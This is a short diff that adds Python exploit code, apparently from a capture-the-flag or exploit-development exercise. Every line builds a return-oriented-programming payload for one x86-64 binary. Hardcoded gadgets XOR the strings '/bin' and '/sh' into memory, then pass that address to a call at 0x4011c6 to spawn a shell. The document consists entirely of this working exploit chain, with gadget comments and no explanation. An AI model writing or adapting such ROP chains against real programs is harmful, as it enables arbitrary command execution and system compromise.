@@ -1,0 +1,17 @@
+payload = p64(0x45e3b8)
+#0x000000000045e3b8: pop rbx; ret; 
+payload += p64(0x56a058)+p64(0x4b7385)
+# 0x00000000004b7385: pop rdi; ret; 
+payload += p64(0x6e69622f)+p64(0x53ed3c)
+# 0x000000000053ed3c: xor dword ptr [rbx], edi; idiv bh; ret 1; 
+payload += p64(0x45e3b8)+"\x00"*1
+# 0x000000000045e3b8: pop rbx; ret; 
+payload += p64(0x56a05c)+p64(0x4b7385)
+# 0x00000000004b7385: pop rdi; ret; 
+payload += p64(0x68732f)+p64(0x53ed3c)
+# 0x000000000053ed3c: xor dword ptr [rbx], edi; idiv bh; ret 1; 
+payload += p64(0x4b7385)+"\x00"*1
+# 0x00000000004b7385: pop rdi; ret; 
+payload += p64(0x56a058)+p64(0x4011c6)
+# call address 0x4011c6
+payload += p64(0x4011c6)
